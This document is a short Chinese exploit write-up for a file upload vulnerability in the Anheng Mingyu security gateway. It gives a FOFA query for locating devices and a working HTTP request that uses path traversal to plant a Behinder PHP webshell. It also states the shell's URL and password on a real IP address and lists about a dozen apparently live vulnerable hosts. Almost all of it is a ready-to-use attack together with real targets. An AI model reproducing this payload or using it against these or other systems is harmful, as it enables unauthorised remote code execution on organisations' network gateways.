# 安恒明御安全网关 aaa_local_web_preview 文件上传漏洞

    ## fofa

```
title="明御安全网关"
```

## poc

```
POST /webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../HKfQgRMO.php HTTP/1.1
Host: 111.17.161.250:8043
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a
Referer: https://111.17.161.250:8043
Accept-Encoding: gzip
Content-Length: 671

--849978f98abe41119122148e4aa65b1a
Content-Disposition: form-data; name="123"; filename="405cFf.php"
Content-Type: text/plain

<?php @error_reporting(0); session_start(); $key="e45e329feb5d925b"; $_SESSION['k']=$key; session_write_close(); $post=file_get_contents("php://input"); if(!extension_loaded('openssl')) {$t="base64_"."decode"; $post=$t($post.""); for($i=0;$i<strlen($post);$i++) {$post[$i] = $post[$i]^$key[$i+1&15]; }} else {$post=openssl_decrypt($post, "AES128", $key);} $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p."");}} @call_user_func(new C(),$params); ?>
--849978f98abe41119122148e4aa65b1a--
```

WebShell URL: https://111.17.161.250:8043/HKfQgRMO.php
Password: rebeyond
WebShell tool: Behinder v3.0
Webshell type: php



## 漏洞列表

```
https://111.17.161.250:8043
http://113.204.212.42:8084
https://122.225.61.202:4434
https://122.9.61.40:44300
http://122.9.61.41:1080
https://122.9.61.41:44300
https://122.9.61.42:44300
http://122.9.61.94:1080
https://202.107.190.91:60001
http://221.224.214.186:5555
http://222.142.60.105:8081
http://49.73.47.13:5555
```
